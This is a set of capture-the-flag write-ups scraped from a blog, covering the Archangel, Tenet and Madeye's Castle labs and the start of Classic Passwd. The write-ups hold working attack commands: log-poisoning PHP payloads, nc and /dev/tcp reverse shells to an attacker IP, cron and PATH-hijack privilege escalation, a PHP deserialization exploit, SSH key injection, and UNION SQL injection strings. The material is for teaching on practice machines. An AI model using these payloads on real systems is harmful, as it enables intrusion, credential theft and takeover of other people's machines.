LFI.    lets using curl to testing rce i try to get /etc/passwd and its work!! . now after that letr try exploit by user-agent and look at access. log : $ curl http://mafialive. thm/test. php?view=/var/www/html/development_testing/. . //. . //. . //. . //. . /var/log/apache2/access. log|Log Poisoning: then user-agent to exploit curl 'http://mafialive. thm/test. php?view=/var/www/html/development_testing/. . //. . //. . //. . //. . /var/log/apache2/access. log' -H  User-Agent: razor &lt;?php system('id'); ?&gt; rxd 10. 2. 47. 251 - - [12/Feb/2021:18:53:51 +0530]  GET /test. php?view=/var/www/html/development_testing/. . //. . //. . //. . //. . /var/log/apache2/access. log HTTP/1. 1  200 142433  -   razor uid=33(www-data) gid=33(www-data) groups=33(www-data) rxd yeay we got RCE via LFI and log poisoning, now we can get shell. $ curl 'http://mafialive. thm/test. php?view=/var/www/html/development_testing/. . //. . //. . //. . //. . /var/log/apache2/access. log' -H  User-Agent: razor &lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 2. 47. 251 1337 &gt;/tmp/f'); ?&gt; rxd $ nc -lvnp 1337                                               1 ⨯listening on [any] 1337 . . . connect to [10. 2. 47. 251] from (UNKNOWN) [10. 10. 172. 38] 58492/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ lsindex. htmlmrrobot. phprobots. txttest. php$ and we get user flag $ cat /home/archangel/user. txtthm{lf----------------ky}Flag 4: after that we can check crontab : www-data@ubuntu:/var/www/html/mafialive$ cat /etc/crontabcat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron. d. These files also have username fields,# that none of the other crontabs do. SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command*/1 *  * * *  archangel /opt/helloworld. sh17 *  * * *  root  cd / &amp;&amp; run-parts --report /etc/cron. hourly25 6  * * *  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. daily )47 6  * * 7  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. weekly )52 6  1 * *  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. monthly )#www-data@ubuntu:/var/www/html/mafialive$ You can see there is a crontab from the archangel, now let’s check the permissions www-data@ubuntu:/var/www/html/mafialive$ ls -la /opt/helloworld. sh-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld. shwww-data@ubuntu:/var/www/html/mafialive$ Wow all user can access it, so weird :X. now lets exploit that with sending reverse shell : echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 2. 47. 251 6969 &gt;/tmp/f' &gt;&gt; /opt/helloworld. sh'then the crontab will be like this : www-data@ubuntu:/var/www/html/mafialive$ cat /opt/helloworld. sh #!/bin/bashecho  hello world  &gt;&gt; /opt/backupfiles/helloworld. txtrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 2. 47. 251 6969 &gt;/tmp/fAnd wait a minute for getting a shell, then we can get the user : $ nc -lvnp 6969listening on [any] 6969 . . . connect to [10. 2. 47. 251] from (UNKNOWN) [10. 10. 172. 38] 39360/bin/sh: 0: can't access tty; job control turned off$ iduid=1001(archangel) gid=1001(archangel) groups=1001(archangel)and we found the flag of user again archangel@ubuntu:~/secret$ cat user2. txtcat user2. txtthm{h0r-------------------------------------r0n}Privilage Escalation: after get in user archangel we can check the permission : $ find / -perm -u=s -type f 2&gt;/dev/null/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chfn/usr/bin/chsh/usr/bin/passwd/usr/bin/traceroute6. iputils/usr/bin/sudo/usr/lib/dbus-1. 0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/bin/umount/bin/su/bin/mount/bin/fusermount/bin/ping/home/archangel/secret/backuplets check file backup with strings : archangel@ubuntu:~/secret$ strings backupstrings backup/lib64/ld-linux-x86-64. so. 2setuidsystem__cxa_finalizesetgid__libc_start_mainlibc. so. 6GLIBC_2. 2. 5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\A]A^A_cp /home/user/archangel/myfiles/* /opt/backupfiles:*3$ GCC: (Ubuntu 10. 2. 0-13ubuntu1) 10. 2. 0/usr/lib/gcc/x86_64-linux-gnu/10/. . /. . /. . /x86_64-linux-gnu/Scrt1. o__abi_tagcrtstuff. cderegister_tm_clones__do_global_dtors_auxcompleted. 0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrybackup. c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2. 2. 5__libc_start_main@@GLIBC_2. 2. 5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2. 2. 5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2. 2. 5__cxa_finalize@@GLIBC_2. 2. 5. symtab. strtab. shstrtab. interp. note. gnu. property. note. gnu. build-id. note. ABI-tag. gnu. hash. dynsym. dynstr. gnu. version. gnu. version_r. rela. dyn. rela. plt. init. plt. got. plt. sec. text. fini. rodata. eh_frame_hdr. eh_frame. init_array. fini_array. dynamic. data. bss. commentarchangel@ubuntu:~/secret$i found this : cp /home/user/archangel/myfiles/* /opt/backupfilesIn the hint they have also mentioned about “certain paths are dangerous”. This is all coming together, cp command is being executed without absolute path (/bin/cp), that means when this binary get executed, our shell search for “cp” in each directory in the path list to look fo the executable file by that name. Then shell will then run the first matching program it finds. as we can see this path where its source and destination of copy command is being executed and We can take advantage of this misconfiguration in SUID binary (backup). you can follow my command : archangel@ubuntu:~/secret$ echo '#!/bin/bash' &gt; cparchangel@ubuntu:~/secret$ lsbackup cp user2. txtarchangel@ubuntu:~/secret$ echo  /bin/bash  &gt;&gt; cparchangel@ubuntu:~/secret$ chmod +x cparchangel@ubuntu:~/secret$ cat cp#!/bin/bash/bin/bashand we can update path for executing backup archangel@ubuntu:~/secret$ export PATH=$PWD:$PATHarchangel@ubuntu:~/secret$ echo $PATH/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binarchangel@ubuntu:~/secret$Flag Root: Now just run the backup : archangel@ubuntu:~/secret$ . /backup root@ubuntu:~/secret# cdroot@ubuntu:~# iduid=0(root) gid=0(root) groups=0(root),1001(archangel)root@ubuntu:~# cat /root/root. txt thm{p4t--------------------------------------------------------10n}root@ubuntu:~# Yeay we get the root flag Happy hacking :D "
    }, {
    "id": 22,
    "url": "/writeup-hackthebox-tenet/",
    "title": "Hackthebox Tenet",
    "body": "2021/02/11 - Introduction: The tenet machine of Hackthebox is an active machine. here we will learn a lot about RCE in php and other privileges. I suggest you read all of these writeups to understand what’s going on here. you can join this room in here Enumeration: Nmap: first we must scanning the machine : $ sudo nmap -sC -sV 10. 10. 10. 223 Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-11 21:56 WIBNmap scan report for tenet. htb (10. 10. 10. 223)Host is up (0. 020s latency). Not shown: 998 closed portsPORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)|  256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-generator: WordPress 5. 6|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: TenetService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8. 81 secondsThats only 2 port open. now lets put tenet. htb to /etc/hosts and see what happen. $ sudo nano /etc/hosts127. 0. 0. 1    localhost127. 0. 1. 1    Razor10. 10. 10. 223 tenet. htb# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersnow after that lets jump to webserver : http://tenet. htb After I looking around on the website I found a comment on the migration tab which gives us a hint, namely “The sator php”, let’s try inputting Sator into a subdomain and looking for the sator. php file: sudo nano /etc/hosts127. 0. 0. 1    localhost127. 0. 1. 1    Razor10. 10. 10. 223 tenet. htb sator. tenet. htb# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersand thats right, subdomain is working but its just only default webpage from apache.  Lets put sator. php on this subdomain : now you can grab php with add extension . bak and we can analysis : There is the code : &lt;?phpclass DatabaseExport{    public $user_file = 'users. txt';    public $data = '';    public function update_db()    {        echo '[+] Grabbing users from text file &lt;br&gt;';        $this-&gt; data = 'Success';    }    public function __destruct()    {        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);        echo '[] Database updated &lt;br&gt;';    //   echo 'Gotta get this working properly. . . ';    }}$input = $_GET['arepo'] ?? '';$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -&gt; update_db();?&gt;Exploit: after searchings i found insecure php serialization payload, you can see at here and i’m modification that to this : &lt;?phpclass DatabaseExport{    public $user_file = 'razor-exploit. php';                            public $data = '&lt;?php exec( /bin/bash -c \'bash -i &gt; /dev/tcp/10. 10. 14. 4&gt;    public function __destruct()    {        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data&gt;        echo '[Anjay abang ganteng lagi exploit code nya nich]';    }}$url = 'http://10. 10. 10. 223/sator. php?arepo=' . urlencode(serialize(new Database&gt;$response = file_get_contents( $url );$response = file_get_contents( http://10. 10. 10. 223/razor-exploit. php );?&gt;In Hacker command : ` nc -lvnp 4444 `then run command : ` php razor. php ` $ php back. php   [Anjay abang ganteng lagi exploit code nya nich]PHP Warning:nc -lvnp 4444listening on [any] 4444 . . . connect to [10. 10. 14. 4] from (UNKNOWN) [10. 10. 10. 223] 34284iduid=33(www-data) gid=33(www-data) groups=33(www-data)then we are connected to shell webserver User: After looking around i found wp-config which is contain credential of user : neil@tenet:/var/www/html/wordpress$ iduid=1001(neil) gid=1001(neil) groups=1001(neil)neil@tenet:/var/www/html/wordpress$ cd /home/neil/neil@tenet:~$ lsuser. txtneil@tenet:~$ cat user. txt 6a9d38459e130f9f9a0c56958f96a1a1neil@tenet:~$ We got user. txt Privilage Escalation: lets look privilage of user neil : neil@tenet:~$ sudo -lMatching Defaults entries for neil on tenet:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:User neil may run the following commands on tenet:  (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH. shwe have to access : /usr/local/bin/enableSSH. sh neil@tenet:~$ cat /usr/local/bin/enableSSH. sh#!/bin/bashcheckAdded() {    sshName=$(/bin/echo $key | /usr/bin/cut -d     -f 3)    if [[ ! -z $(/bin/grep $sshName /root/. ssh/authorized_keys) ]]; then        /bin/echo  Successfully added $sshName to authorized_keys file!     else        /bin/echo  Error in adding $sshName to authorized_keys file!     fi}checkFile() {    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then        /bin/echo  Error in creating key file!         if [[ -f $1 ]]; then /bin/rm $1; fi        exit 1    fi}addKey() {    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)    (umask 110; touch $tmpName)    /bin/echo $key &gt;&gt;$tmpName    checkFile $tmpName    /bin/cat $tmpName &gt;&gt;/root/. ssh/authorized_keys    /bin/rm $tmpName}from thats script we can inject to getting root.  first create id_rsa on your machine ` ssh-keygen ` then create script like this :  while truedo echo ' put id_rsa. pub' |tee /tmp/ssh-*done  then put id_rsa. pub to script  while truedo echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuC30kS7Gb89F8nYQetIKn6mgjGSA5nmX8fn3WQ2Gim+iBJPTmeIF6skdkM4z8//gejqC9RP5TkkuOIhxPcbI5i8Jz5lF2DbvLeUSJp2OfVQuI4DxmHTGwzMvIA40hkYSvwvgYErJAfZLLOuNyMOH6s4g6Ng970947N9P1094Z1fzavO4ahYHrM9Uyje6ceUIBstZe4Ma57Rgi3FCV8tmUkmS/gskWo1cR2pTmtucvsP8rGB2+X86y/pLkd3iipX4k2DhOCeSH894roy6uLB0+EEg3pRo2Ge0IOym0KI5o11gt0JS3hwF9I2REwODyolH5j/lZBtngDag2oCC5KqWVJGd6yha+nCmZWwifckFEpNbfNA0L3gSxpQJ5aE/xKJZffcMPfMdBHZzoz2q53XKmBUhXKeORsU42KiV+CbPxinz6OjXcSsIpw3IB/99HpoMW2tFZKLZYZVcM9vWjCg7Q2CJZUgPrwNBBSTi3LlFzSkmPsQXxclDA21fPnBmip1c=' |tee /tmp/ssh-*done  chmod 600 to id_rsa then run the scipt . /looping. sh script will still looping, we can leave that alone and log in again at a different term in second term run this “ sudo /usr/local/bin/enableSSH. sh “ for 4 times and we connect in hacker machines :  ssh -i id_rsa root@10. 10. 10. 223    if thats doesn’t work you can reply again until it works Happy hacking :D "
    }, {
    "id": 23,
    "url": "/writeup-tryhackme-madeye-castle/",
    "title": "Tryhackme Madeye's Castle",
    "body": "2021/02/10 - Introduction: in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here https://tryhackme. com/room/madeyescastle Enumeration: Nmap: what we have to do first is scanning the ip :  $ sudo nmap -sC -sV 10. 10. 185. 66 # Nmap 7. 91 scan initiated Mon Feb 1 13:01:15 2021 as: nmap -sC -sV -oA nmap hogwarts-castle. thmNmap scan report for hogwarts-castle. thm (10. 10. 128. 52)Host is up (0. 34s latency). Not shown: 996 filtered portsPORT  STATE SERVICE   VERSION22/tcp open ssh     OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)|  256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)|_ 256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)80/tcp open http    Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: Amazingly It works139/tcp open netbios-ssn Samba smbd 3. X - 4. X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4. 7. 6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -4s, deviation: 1s, median: -5s|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |  OS: Windows 6. 1 (Samba 4. 7. 6-Ubuntu)|  Computer name: hogwartz-castle|  NetBIOS computer name: HOGWARTZ-CASTLE\x00|  Domain name: \x00|  FQDN: hogwartz-castle|_ System time: 2021-02-01T06:01:41+00:00| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-02-01T06:01:41|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Feb 1 13:02:26 2021 -- 1 IP address (1 host up) scanned in 70. 50 secondsSMB: As you can see in nmap we have port open 139,445 which is it is smb share, then lets using smbmap for enumration smb smbmap -H 10. 10. 185. 66 -R                                                                  130 ⨯[+] Guest session    IP: 10. 10. 185. 66:445  Name: unknown                          Disk                          Permissions   Comment    ----                          -----------   -------    print$                         NO ACCESS    Printer Drivers    sambashare                       READ ONLY    Harry's Important Files    . \sambashare\*    dr--r--r--        0 Thu Nov 26 08:19:19 2020  .     dr--r--r--        0 Thu Nov 26 07:57:55 2020  . .     fr--r--r--       874 Thu Nov 26 08:06:32 2020  spellnames. txt    fr--r--r--       147 Thu Nov 26 08:19:19 2020  . notes. txt    IPC$                          NO ACCESS    IPC Service (hogwartz-castle server (Samba, Ubuntu))There is some share with default setting which is everyone can access it. smbclient //10. 10. 185. 66/sambashare                                    1 ⨯Enter WORKGROUP\razor's password: Try  help  to get a list of possible commands. smb: \&gt; ls .                  D    0 Thu Nov 26 08:19:20 2020 . .                  D    0 Thu Nov 26 07:57:55 2020 spellnames. txt           N   874 Thu Nov 26 08:06:32 2020 . notes. txt             H   147 Thu Nov 26 08:19:19 2020        9219412 blocks of size 1024. 4413488 blocks availablesmb: \&gt; get spellnames. txtgetting file \spellnames. txt of size 874 as spellnames. txt (0. 6 KiloBytes/sec) (average 0. 6 KiloBytes/sec)smb: \&gt; get . notes. txt getting file \. notes. txt of size 147 as . notes. txt (0. 1 KiloBytes/sec) (average 0. 4 KiloBytes/sec)now we have 2 file from smbshare lets checkit  spellnames. txt  avadakedavracrucioimperio---incendioevanescoaguamenti  . notes. txt  Hagrid told me that spells names are not good since they will not  rock you Hermonine loves historical text editors along with reading old books.   Gobuster:  now after enumeration we can scanning webserver especially for directory open gobuster dir -u 10. 10. 185. 66 -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt ===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 185. 66[+] Threads:    10[+] Wordlist:    /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2. 3-medium. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Timeout:    10s===============================================================2021/02/10 18:27:24 Starting gobuster===============================================================/backup (Status: 301)if you dont have wordlist you can download right here : https://github. com/danielmiessler/SecLists  we found backup directory, now lets scan again to directory backup (“-u 10. 10. 185. 66/backup “)  2021/02/10 18:31:43 Starting gobuster===============================================================/email (Status: 200)  then we found email, lets check it  we have message from this directory, then lets check the source code webserver We found hosts on source code, now lets put this on /etc/hosts $ sudo nano /etc/hosts127. 0. 0. 1    localhost127. 0. 1. 1    Razor10. 10. 185. 66 hogwartz-castle. thm# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersnow lets go to http://hogwartz-castle. thm then we found login form Exploit: First i’m try to using sql map doesn’t working but there give us some hint. SQL Injection: lets check manually and to make it easier we can use burp suite like this : then send it to repeater in sqlmap give the hint that is UNION injectable with 4 colloums, now put command sql injection to username : razor' UNION ALL SELECT NULL,NULL,NULL,NULL--and here the result : here I am trying to send null values to 4 columns and get an error, so there are 4 columns where column 1 and 4 are injectable username and password. we can identify the column for the user and password in 1 and 4. The result : razor' UNION ALL SELECT 1,2,3,4-- After that we can check the version in column 1 or 4 or both. if you don’t know that you can read in here and command for sqlite in here . then using this command : razor'UNION ALL SELECT sqlite_version(),2,3,sqlite_version()-- then lets find table name : users, to find that you need this command : razor' UNION ALL SELECT sql,2,3,4 FROM sqlite_master WHERE tbl_name= 'users' AND type = 'table'-- Now we find the contents of all the column including username, password, admin, and notes . but the problem is we can only see 1 username and 1 password, and I tried selecting everything from table using * and the result was an error razor' UNION ALL SELECT name,2,3,password FROM users-- but if we check the columns of table we have 40 colomns which is there are a lot of user and password razor'UNION ALL SELECT COUNT(name),2,3,COUNT(password) FROM users-- now after i’m searching and I found this article here which helps me to extract the contents from the table column. in that site we can use group_concat() to see all of table : razor'UNION ALL SELECT group_concat(name),2,3,COUNT(password) FROM users-- And for The notes : razor'UNION ALL SELECT group_concat(notes),2,3,COUNT(password) FROM users-- now when we align the name and notes it will look like this : from the picture we can conclude that user harry uses a password with best64 Cracking Hash:  first we have file spellnames. txt then we have a hint that the password used is best64 where we can use the best64 hashcat rule  hashcat -D 2 --stdout -r /usr/share/hashcat/rules/best64. rule spellnames. txt new_crackabel  Indentify type of hash  hash-identifier b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885--------------------------------------------------Possible Hashs:[+] SHA-512[+] WhirlpoolLeast Possible Hashs:[+] SHA-512(HMAC)[+] Whirlpool(HMAC)-------------------------------------------------- Now we just crack the password $ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabelhashcat (v6. 1. 1) starting. . . * Device #1: WARNING! Kernel exec timeout is not disabled.       This may cause  CL_OUT_OF_RESOURCES  or related errors.       To disable the timeout, see: https://hashcat. net/q/timeoutpatch* Device #2: WARNING! Kernel exec timeout is not disabled.       This may cause  CL_OUT_OF_RESOURCES  or related errors.       To disable the timeout, see: https://hashcat. net/q/timeoutpatchCUDA API (CUDA 11. 2)====================* Device #1: GeForce GTX 950, 1501/2001 MB, 6MCUOpenCL API (OpenCL 1. 2 CUDA 11. 2. 136) - Platform #1 [NVIDIA Corporation]========================================================================* Device #2: GeForce GTX 950, skippedOpenCL API (OpenCL 1. 2 pocl 1. 6, None+Asserts, LLVM 9. 0. 1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]=============================================================================================================================* Device #3: pthread-Intel(R) Pentium(R) Gold G5400 CPU @ 3. 70GHz, skippedMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256INFO: All hashes found in potfile! Use --show to display them. Started: Wed Feb 10 22:48:58 2021Stopped: Wed Feb 10 22:48:59 2021$ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabel --showb326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123User escalation: User1: Now we have first user, now lets jump in to ssh : ssh harry@10. 10. 185. 66harry@hogwartz-castle:~$ iduid=1001(harry) gid=1001(harry) groups=1001(harry)harry@hogwartz-castle:~$ lsuser1. txtharry@hogwartz-castle:~$ cat user1. txt RME{t----------------------------------c}harry@hogwartz-castle:~$ User2: now lets check privilage of harry harry@hogwartz-castle:~$ sudo -l[sudo] password for harry: Matching Defaults entries for harry on hogwartz-castle:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser harry may run the following commands on hogwartz-castle:  (hermonine) /usr/bin/pico  (hermonine) /usr/bin/picoharry@hogwartz-castle:~$ Then check /usr/bin/pico and its a nano, now we can exploit it to user hermonine and use gtfobins here sudo -u hermonine /usr/bin/pico^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0here the shell condition is not good but it doesn’t matter and we can still use it $ cdsh: 6: cd: can't cd to /home/harry$ bash -i        bash: /home/harry/. bashrc: Permission deniedhermonine@hogwartz-castle:~$ export TERM=xtermhermonine@hogwartz-castle:~$ cd /home/hermonine/hermonine@hogwartz-castle:/home/hermonine$ lsuser2. txthermonine@hogwartz-castle:/home/hermonine$ cat user2. txt RME{p--------------------------------------6}hermonine@hogwartz-castle:/home/hermonine$ iduid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)hermonine@hogwartz-castle:/home/hermonine$Exploit Root: Lets check SUID permission with this command : hermonine@hogwartz-castle:/home/hermonine$ find / -perm -u=s -type f 2&gt;/dev/null/srv/time-turner/swagger/usr/bin/sudo/usr/bin/pkexec/usr/bin/chsh/usr/bin/chfn/usr/bin/newuidmap/usr/bin/traceroute6. iputils/usr/bin/newgidmap/usr/bin/passwd/usr/bin/at/usr/bin/gpasswd/usr/bin/newgrp/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1. 0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysign/bin/umount/bin/fusermount/bin/su/bin/ping/bin/mounthermonine@hogwartz-castle:/home/hermonine$then we have found swagger access for the hermonine user,now if you dont know how to get swagger to your machine you can read here : first you can copy that to /tmp and you can use scp tools and following this Victim : hermonine@hogwartz-castle:/home/hermonine$ cp /srv/time-turner/swagger /tmphermonine@hogwartz-castle:/home/hermonine$ cd /tmp/hermonine@hogwartz-castle:/tmp$ lsswaggerHacker (Your Machines):$ scp harry@10. 10. 185. 66:/tmp/swagger . /swagger harry@10. 10. 185. 66's password: swagger                                     100% 8816  24. 3KB/s  00:00then we can use ghidra for see main function of swagger, lets check in function section main : undefined8 main(void){ time_t tVar1; long in_FS_OFFSET; uint local_18; uint local_14; long local_10;  local_10 = *(long *)(in_FS_OFFSET + 0x28); tVar1 = time((time_t *)0x0); srand((uint)tVar1); local_14 = rand(); printf( Guess my number:  ); __isoc99_scanf(&amp;DAT_00100b8d,&amp;local_18); if (local_14 == local_18) {  impressive(); } else {  puts( Nope, that is not what I was thinking );  printf( I was thinking of %d\n ,(ulong)local_14); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {          /* WARNING: Subroutine does not return */  __stack_chk_fail(); } return 0;}Check in function section impresive : void impressive(void){ setregid(0,0); setreuid(0,0); puts( Nice use of the time-turner! ); printf( This system architecture is  ); fflush(stdout); system( uname -p ); return;}The logic of this program is that when you guess the correct number, the impresive () function will execute the uname command and,here we can execute the binary “uname -p” which is where we can manipulate path variables and can pass malicious coderesource for rand() here srand() : The srand() function in C++ seeds the pseudo random number generator used by the rand() function. The seed for rand() function is 1 by default. It means that if no srand() is called before rand(), the rand() function behaves as if it was seeded with srand(1) and the rand() value always generated same. time() : The time() function is defined in time. h (ctime in C++) header file. This function returns the time since 00:00:00 UTC, January 1, 1970 (Unix timestamp) in seconds lets executes a binary called uname , if we run swagger program with same logic we get the same value multiple time. hermonine@hogwartz-castle:/tmp$ for i in $(seq 1 10);do echo  razor  | . /swagger ;done;Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117Guess my number: Nope, that is not what I was thinkingI was thinking of 1144253117hermonine@hogwartz-castle:/tmp$when stopping the rand () function. The first time you need to do is take the first executable rand () value and enter the second execute value. now lets create binary at /tmp and add /tmp to $PATH, doing this for getting root privilage using path variable hermonine@hogwartz-castle:/tmp$ touch unamehermonine@hogwartz-castle:/tmp$ echo  sudo usermod -aG sudo harry  &gt; unamehermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATHhermonine@hogwartz-castle:/tmp$ chmod +x unamethat code in will add user harry to sudo group when /srv/time-turner/swagger will be executed hermonine@hogwartz-castle:/tmp$ /srv/time-turner/swagger|grep -Eo '[^ ]+$' |tail -1| /srv/time-turner/swagger whoamiGuess my number: Nice use of the time-turner!This system architecture is hermonine@hogwartz-castle:/tmp$ su harryPassword: To run a command as administrator (user  root ), use  sudo &lt;command&gt; . See  man sudo_root  for details. harry@hogwartz-castle:/tmp$ sudo su root[sudo] password for harry: root@hogwartz-castle:/tmp# iduid=0(root) gid=0(root) groups=0(root)root@hogwartz-castle:/tmp# cat /root/root. txt RME{M------------------------------f}root@hogwartz-castle:/tmp#Happy Hacking :D "
    }, {
    "id": 24,
    "url": "/writeup-tryhackme-classic-passwd/",
    "title": "Tryhackme Classic Passwd",
    "body": "2021/02/09 - Introduction: in this room you will train your skills in reverse engineer and bypass login. you can see room right here : https://tryhackme. com/room/classicpasswd radare2: We can use radare2 to open binary and if you dont have it you can download right here : https://github. com/radareorg/radare2Then open radare2 and here is output: $ r2 Challenge. Challenge                          1 ⨯Warning: run r2 with -e io. cache=true to fix relocations in disassembly[0x000010a0]&gt; aa[x] Analyze all flags starting with sym. and entry0 (aa)[0x000010a0]&gt; pdf @main      ; DATA XREF from entry0 @ 0x10bd┌ 31: int main (int argc, char **argv, char **envp);│      0x000012f6   55       push rbp│      0x000012f7   4889e5     mov rbp, rsp│      0x000012fa   b800000000   mov eax, 0│      0x000012ff   e881feffff   call sym. vuln│      0x00001304   b800000000   mov eax, 0│      0x00001309   e87bffffff   call sym. gfl│      0x0000130e   b800000000   mov eax, 0│      0x00001313   5d       pop rbp└      0x00001314   c3       ret[0x000010a0]&gt; we don’t get the any hint here therefore we use ltrace to simplify our analysisthen lets use ltrace ltrace: if your dont have you can install in linux :  sudo apt update &amp;&amp; sudo apt install ltrace now lets tun this with ltrace :  $ chmod +x Challenge. Challenge $ ltrace . /Challenge. Challengeprintf( Insert your username:  )         = 22__isoc99_scanf(0x555b547fe01b, 0x7ffdad52ce30, 0, 